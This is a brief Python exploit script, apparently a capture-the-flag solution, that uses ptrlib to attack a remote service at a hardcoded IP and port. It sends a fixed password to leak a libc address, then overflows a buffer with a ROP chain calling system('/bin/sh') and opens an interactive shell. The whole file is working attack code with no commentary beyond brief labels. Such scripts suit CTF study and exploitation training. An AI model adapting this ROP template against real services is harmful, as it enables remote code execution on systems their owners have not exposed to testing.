from ptrlib import *

libc = ELF("./libc.so.6")
#sock = Process("./IfYouWanna")
sock = Socket("3.112.113.4", 20002)
libc_pop_rdi = 0x0002155f
rop_ret = 0x00400293

# leak libc
password = "mora+cookie+nan+t4shi+swa11ow="
password += hex(0xace)[2:]
sock.sendlineafter("> ", password)
sock.recvline()
libc_base = int(sock.recvline().split(b": ")[1], 16)
logger.info("libc = " + hex(libc_base))

# get the shell!
payload = b'Y' * 0xa0
payload += p64(0xffffffffffffffff)
payload += p64(rop_ret)
payload += p64(libc_base + libc_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.sendlineafter("> ", payload)

sock.interactive()
